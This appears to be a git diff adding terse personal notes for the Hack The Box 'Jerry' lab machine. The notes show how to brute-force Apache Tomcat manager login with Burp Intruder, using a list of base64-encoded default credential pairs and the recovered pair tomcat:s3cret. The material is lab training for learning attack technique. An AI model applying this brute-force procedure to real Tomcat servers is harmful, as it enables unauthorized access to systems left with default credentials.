@@ -295,6 +295,65 @@ A shell with user privileges was successfully opened. Then comes privilege escal
 
 While the materpreter shell was still open, I only got 40 seconds to use the session and explore a vulnerability to gain root access.
 
+----------
+JERRY: easy
+danger of default credentials
 
+Firefox: http://10.10.10.95:8080/ -- shouldn't be open
+Goo Tomcat default credentials
+https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
 
-Awesome training.
+BurpSuite
+Target/site map
+Proxy - intercept
+
+FoxyProxy on
+Reload Firefox: http://10.10.10.95:8080/
+Proxy intercept - Forward
+get authorization - send to decoder
+Decoder base64
+
+send to repeater
+send to intruder
+
+Brute force:
+default credentials in txt -  replace 'space' por :
+Intruder 2 positions - Sniper in base64
+
+bash> echo -n 'tomcat:tomcat' | base64
+for i in $(cat tomcat.txt); echo -n $i | base64
+copy 
+YWRtaW46
+YWRtaW46UGFzc3dvcmQx
+YWRtaW46cGFzc3dvcmQx
+YWRtaW46YWRtaW4=
+YWRtaW46dG9tY2F0
+Ym90aDp0b21jYXQ=
+bWFuYWdlcjptYW5hZ2Vy
+cm9sZTE6cm9sZTE=
+cm9sZTE6dG9tY2F0
+cm9sZTpjaGFuZ2V0aGlz
+cm9vdDpQYXNzd29yZDE=
+cm9vdDpjaGFuZ2V0aGlz
+cm9vdDpwYXNzd29yZA==
+cm9vdDpwYXNzd29yZDE=
+cm9vdDpyMDB0
+cm9vdDpyb290
+cm9vdDp0b29y
+dG9tY2F0OnRvbWNhdA==
+dG9tY2F0OnMzY3JldA==
+dG9tY2F0OnBhc3N3b3JkMQ==
+dG9tY2F0OnBhc3N3b3Jk
+dG9tY2F0Og==
+dG9tY2F0OmFkbWlu
+dG9tY2F0OmNoYW5nZXRoaXM=
+
+paste Intruder 2 payloads
+
+Intruder - 2 - positions - Sniper -> Authorization: Basic $example_do_site_ping_nRvbWNhdA==$
+tirar URL encode do rodapé
+
+Start attack
+look for 200
+dG9tY2F0OnMzY3JldA== -> tomcat s3cret
+
